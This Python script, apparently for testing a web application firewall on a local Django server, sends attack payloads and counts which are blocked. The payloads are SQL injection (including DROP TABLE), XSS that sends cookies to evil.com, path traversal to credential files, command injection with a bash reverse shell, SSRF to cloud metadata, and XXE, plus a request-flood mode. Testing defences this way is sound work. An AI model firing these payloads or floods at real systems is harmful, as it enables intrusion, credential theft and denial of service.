#!/usr/bin/env python
import sys
import time
import random
import argparse
import urllib.parse

try:
    import requests
except ImportError:
    print("Install requests: pip install requests")
    sys.exit(1)

BASE_URL = "http://127.0.0.1:8000"

PAYLOADS = {
    "sqli": [
        ("GET", "/search", {"q": "1' OR '1'='1"}, {}),
        ("GET", "/api/users", {"id": "1 UNION SELECT username,password FROM users--"}, {}),
        ("GET", "/products", {"id": "1' AND SLEEP(5)--"}, {}),
        ("POST", "/login", {}, {"username": "admin'--", "password": "anything"}),
        ("GET", "/search", {"q": "1; DROP TABLE users--"}, {}),
        ("GET", "/api/data", {"filter": "1 AND EXTRACTVALUE(1,CONCAT(0x5c,(SELECT user())))"}, {}),
    ],
    "xss": [
        ("GET", "/search", {"q": "<script>alert(document.cookie)</script>"}, {}),
        ("POST", "/comment", {}, {"text": '<img src=x onerror=alert(1)>'}),
        ("GET", "/page", {"title": '"><script>fetch("http://evil.com?c="+document.cookie)</script>'}, {}),
        ("POST", "/feedback", {}, {"msg": '<svg/onload=alert(1)>'}),
        ("GET", "/search", {"q": "javascript:eval(atob('YWxlcnQoMSk='))"}, {}),
    ],
    "path_traversal": [
        ("GET", "/../etc/passwd", {}, {}),
        ("GET", "/api/file", {"path": "../../etc/shadow"}, {}),
        ("GET", "/%2e%2e%2fetc%2fpasswd", {}, {}),
        ("GET", "/download", {"file": "../../../../windows/system32/config/sam"}, {}),
        ("GET", "/static/../../../etc/hosts", {}, {}),
    ],
    "rce": [
        ("GET", "/api/ping", {"host": "127.0.0.1; ls -la"}, {}),
        ("GET", "/api/ping", {"host": "127.0.0.1 | cat /etc/passwd"}, {}),
        ("POST", "/api/exec", {}, {"cmd": "`whoami`"}),
        ("GET", "/api/check", {"url": "127.0.0.1 && id"}  , {}),
        ("POST", "/api/process", {}, {"data": "$(cat /etc/shadow)"}),
        ("GET", "/run", {"cmd": "; /bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"}, {}),
    ],
    "ssrf": [
        ("GET", "/api/fetch", {"url": "http://169.254.169.254/latest/meta-data/"}, {}),
        ("GET", "/proxy", {"target": "http://localhost:6379/"}, {}),
        ("GET", "/api/load", {"src": "file:///etc/passwd"}, {}),
        ("POST", "/webhook", {}, {"callback": "http://127.0.0.1:8080/admin"}),
        ("GET", "/fetch", {"url": "gopher://localhost:25/xHELO"}, {}),
    ],
    "xxe": [
        ("POST", "/api/upload", {},
         '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'),
        ("POST", "/api/parse", {},
         '<!DOCTYPE data [<!ENTITY % file SYSTEM "file:///etc/shadow">]><data/>'),
    ],
    "ddos": [
        ("GET", "/", {}, {}),
        ("GET", "/api/data", {}, {}),
        ("GET", "/search", {"q": "test"}, {}),
    ],
    "normal": [
        ("GET", "/", {}, {}),
        ("GET", "/about", {}, {}),
        ("POST", "/api/login", {}, {"username": "user", "password": "pass"}),
        ("GET", "/search", {"q": "python tutorial"}, {}),
        ("GET", "/products", {"category": "electronics", "page": "1"}, {}),
        ("GET", "/api/users/42", {}, {}),
    ],
}

COLORS = {
    "GREEN": "\033[92m", "RED": "\033[91m",
    "YELLOW": "\033[93m", "CYAN": "\033[96m",
    "RESET": "\033[0m", "BOLD": "\033[1m",
}


def c(color, text):
    return f"{COLORS.get(color, '')}{text}{COLORS['RESET']}"


def send(method, path, params, body, extra_headers=None, session=None):
    url = BASE_URL + path
    headers = {"Accept": "text/html,application/json"}
    if extra_headers:
        headers.update(extra_headers)

    req = session or requests

    try:
        if method == "GET":
            r = req.get(url, params=params, headers=headers, timeout=5, allow_redirects=False)
        elif method == "POST":
            if isinstance(body, str):
                headers["Content-Type"] = "application/xml"
                r = req.post(url, data=body, headers=headers, params=params, timeout=5, allow_redirects=False)
            else:
                r = req.post(url, data=body, headers=headers, params=params, timeout=5, allow_redirects=False)
        else:
            r = req.request(method, url, params=params, data=body, headers=headers, timeout=5, allow_redirects=False)
        return r.status_code
    except requests.exceptions.ConnectionError:
        return "CONN_ERR"
    except requests.exceptions.Timeout:
        return "TIMEOUT"
    except Exception as e:
        return f"ERR:{e}"


def run_attack(attack_type, count=5, delay=0.3, verbose=True):
    payloads = PAYLOADS.get(attack_type, [])
    if not payloads:
        print(c("RED", f"Unknown attack type: {attack_type}"))
        return

    print(c("BOLD", f"\n[{attack_type.upper()}] Sending {count} requests..."))
    session = requests.Session()

    blocked = 0
    allowed = 0
    errors = 0

    for i in range(count):
        method, path, params, body = random.choice(payloads)
        status = send(method, path, params, body, session=session)

        if status == "CONN_ERR":
            print(c("RED", f"  [{i+1}] Connection refused — is Django running?"))
            errors += 1
            break
        elif isinstance(status, str):
            print(c("YELLOW", f"  [{i+1}] {status}"))
            errors += 1
        elif status == 403:
            blocked += 1
            if verbose:
                full = path + ("?" + urllib.parse.urlencode(params) if params else "")
                print(c("RED", f"  [{i+1}] {method} {full[:60]} → {status} BLOCKED"))
        elif status in (200, 301, 302, 404):
            allowed += 1
            if verbose:
                full = path + ("?" + urllib.parse.urlencode(params) if params else "")
                print(c("GREEN", f"  [{i+1}] {method} {full[:60]} → {status} OK"))
        else:
            if verbose:
                print(c("YELLOW", f"  [{i+1}] status={status}"))

        if delay > 0:
            time.sleep(delay)

    print(c("CYAN", f"\n  Summary: {blocked} blocked | {allowed} allowed | {errors} errors"))
    return blocked, allowed, errors


def run_ddos(rps=20, duration=10):
    print(c("BOLD", f"\n[DDOS] Flooding at {rps} req/s for {duration}s..."))
    session = requests.Session()
    session.headers.update({"User-Agent": "python-requests/flood-bot"})

    sent = 0
    blocked = 0
    start = time.time()
    interval = 1.0 / rps

    while time.time() - start < duration:
        t = time.time()
        method, path, params, body = random.choice(PAYLOADS["ddos"])
        status = send(method, path, params, body, session=session)
        sent += 1
        if status == 403:
            blocked += 1
        elif status == "CONN_ERR":
            print(c("RED", "  Connection refused — is Django running?"))
            break
        elapsed = time.time() - t
        sleep = interval - elapsed
        if sleep > 0:
            time.sleep(sleep)

    print(c("CYAN", f"\n  Sent: {sent} | Blocked: {blocked} | Allowed: {sent - blocked}"))


def run_all(count_per_type=5):
    print(c("BOLD", "\n" + "=" * 55))
    print(c("BOLD", "  WAF Attack Simulation — All Types"))
    print(c("BOLD", "=" * 55))

    results = {}
    for atype in ["sqli", "xss", "path_traversal", "rce", "ssrf", "xxe"]:
        r = run_attack(atype, count=count_per_type, delay=0.1, verbose=False)
        if r:
            results[atype] = r

    print(c("BOLD", "\n" + "=" * 55))
    print(c("BOLD", "  Final Results"))
    print(c("BOLD", "=" * 55))
    total_blocked = total_allowed = 0
    for atype, (blocked, allowed, errors) in results.items():
        rate = blocked / (blocked + allowed) * 100 if (blocked + allowed) > 0 else 0
        color = "GREEN" if rate >= 80 else "YELLOW" if rate >= 50 else "RED"
        print(c(color, f"  {atype:20s} blocked={blocked:3d} allowed={allowed:3d} rate={rate:.0f}%"))
        total_blocked += blocked
        total_allowed += allowed

    overall = total_blocked / (total_blocked + total_allowed) * 100 if (total_blocked + total_allowed) > 0 else 0
    print(c("BOLD", f"\n  OVERALL block rate: {overall:.1f}%"))


def main():
    parser = argparse.ArgumentParser(description="WAF Attack Simulator")
    parser.add_argument("--url", default="http://127.0.0.1:8000", help="Base URL")
    parser.add_argument("--type", default="all",
                        help="Attack type: sqli|xss|path_traversal|rce|ssrf|xxe|ddos|all")
    parser.add_argument("--count", type=int, default=10, help="Requests per type")
    parser.add_argument("--delay", type=float, default=0.2, help="Delay between requests (s)")
    parser.add_argument("--ddos-rps", type=int, default=30, help="DDoS requests per second")
    parser.add_argument("--ddos-duration", type=int, default=15, help="DDoS duration (s)")
    args = parser.parse_args()

    global BASE_URL
    BASE_URL = args.url.rstrip("/")

    print(c("BOLD", f"Target: {BASE_URL}"))

    if args.type == "all":
        run_all(args.count)
    elif args.type == "ddos":
        run_ddos(args.ddos_rps, args.ddos_duration)
    else:
        run_attack(args.type, args.count, args.delay)


if __name__ == "__main__":
    main()
